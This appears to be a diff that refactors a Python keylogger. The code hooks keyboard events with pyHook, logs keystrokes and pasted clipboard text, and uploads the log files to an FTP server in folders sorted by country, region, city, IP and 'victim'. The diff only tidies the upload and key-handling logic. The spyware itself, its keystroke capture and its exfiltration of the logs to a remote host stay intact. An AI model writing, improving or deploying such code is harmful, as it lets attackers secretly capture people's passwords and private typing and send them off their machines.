@@ -41,31 +41,18 @@ def log_upload(x):
                 ftp.cwd(city)
                 if ip in ftp.nlst():
                     ftp.cwd(ip)
-                    if victim in ftp.nlst():
-                        ftp.cwd(victim)
-                        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-                        ftp.quit()
-                    else:
+                    if victim not in ftp.nlst():
                         ftp.mkd(victim)
-                        ftp.cwd(victim)
-                        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-                        ftp.quit()
                 else:
                     ftp.mkd(ip)
                     ftp.cwd(ip)
                     ftp.mkd(victim)
-                    ftp.cwd(victim)
-                    ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-                    ftp.quit()
             else:
                 ftp.mkd(city)
                 ftp.cwd(city)
                 ftp.mkd(ip)
                 ftp.cwd(ip)
                 ftp.mkd(victim)
-                ftp.cwd(victim)
-                ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-                ftp.quit()
         else:
             ftp.mkd(region)
             ftp.cwd(region)
@@ -74,9 +61,6 @@ def log_upload(x):
             ftp.mkd(ip)
             ftp.cwd(ip)
             ftp.mkd(victim)
-            ftp.cwd(victim)
-            ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-            ftp.quit()
     else:
         ftp.mkd(country)
         ftp.cwd(country)
@@ -87,9 +71,9 @@ def log_upload(x):
         ftp.mkd(ip)
         ftp.cwd(ip)
         ftp.mkd(victim)
-        ftp.cwd(victim)
-        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
-        ftp.quit()
+    ftp.cwd(victim)
+    ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+    ftp.quit()
     fo = open(f_name, 'w')
     fo.flush()
     fo.close()
@@ -125,7 +109,7 @@ def keypressed(event):
         data = keys
         fp.write(data + "\n")
         fp.close()
-    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
+    elif event.Ascii in [1, 3, 19, 0, 24]:
         pass
     elif event.Ascii == 22:
         keys = pyperclip.paste()
@@ -154,8 +138,6 @@ def keypressed(event):
             log_upload(f_name)
         except:
             pass
-    else:
-        pass
 
 
 obj = pyHook.HookManager()
